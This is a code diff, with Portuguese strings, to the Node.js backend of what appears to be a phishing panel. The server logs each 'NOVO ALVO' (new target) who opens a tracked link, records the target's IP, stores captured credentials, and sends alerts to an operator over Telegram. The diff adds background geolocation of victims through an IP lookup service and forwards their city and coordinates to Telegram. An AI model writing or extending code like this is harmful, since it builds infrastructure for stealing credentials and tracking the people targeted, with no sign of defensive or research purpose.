@@ -67,6 +67,7 @@ async function getLog(id) {
 }
 
 async function saveLog(log) {
+    if (!log.timestamp) log.timestamp = new Date();
     await pool.query('INSERT INTO logs (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [log.id, log]);
 }
 
@@ -108,16 +109,18 @@ app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));
 
 app.get('/api/logs', async (req, res) => {
     try {
-        const { rows } = await pool.query('SELECT data FROM logs ORDER BY (data->>\'timestamp\') DESC');
-        res.json(rows.map(r => r.data));
-    } catch (e) { res.status(500).json([]); }
+        const { rows } = await pool.query('SELECT data FROM logs');
+        const sorted = rows.map(r => r.data).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        res.json(sorted);
+    } catch (e) { res.json([]); }
 });
 
 app.get('/api/links', async (req, res) => {
     try {
-        const { rows } = await pool.query('SELECT data FROM links ORDER BY (data->>\'createdAt\') DESC');
-        res.json(rows.map(r => r.data));
-    } catch (e) { res.status(500).json([]); }
+        const { rows } = await pool.query('SELECT data FROM links');
+        const sorted = rows.map(r => r.data).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+        res.json(sorted);
+    } catch (e) { res.json([]); }
 });
 
 app.post('/api/links', async (req, res) => {
@@ -191,15 +194,28 @@ io.on('connection', (socket) => {
             if (event === 'join') {
                 const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address).replace('::ffff:', '');
                 if (!log) {
-                    log = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Calculando...', creds: [], chat: [], status: 'online' };
+                    log = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
                     io.emit('new_click', log);
                     sendTelegramMsg(`🚨 *NOVO ALVO*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);
+
+                    // Background GeoIP Restore
+                    axios.get(`https://ipapi.co/${ip}/json/`).then(async r => {
+                        if(r.data && !r.data.error) {
+                            log.geo = `${r.data.city}, ${r.data.country_name}`;
+                            log.lat = r.data.latitude; log.lon = r.data.longitude;
+                            await saveLog(log);
+                            io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
+                            sendTelegramMsg(`🌍 *LOCALIZAÇÃO*\n🆔 ID: \`${log.id}\`\n📍: ${log.geo}`);
+                        }
+                    }).catch(()=>{});
                 } else {
                     log.status = 'online';
+                    log.timestamp = new Date();
                 }
                 await saveLog(log);
                 io.emit('update_log', { id: log.id, status: 'online' });
-            } else if (log) {
+            }
+ else if (log) {
                 switch(event) {
                     case 'creds':
                         log.creds.push(data.value);
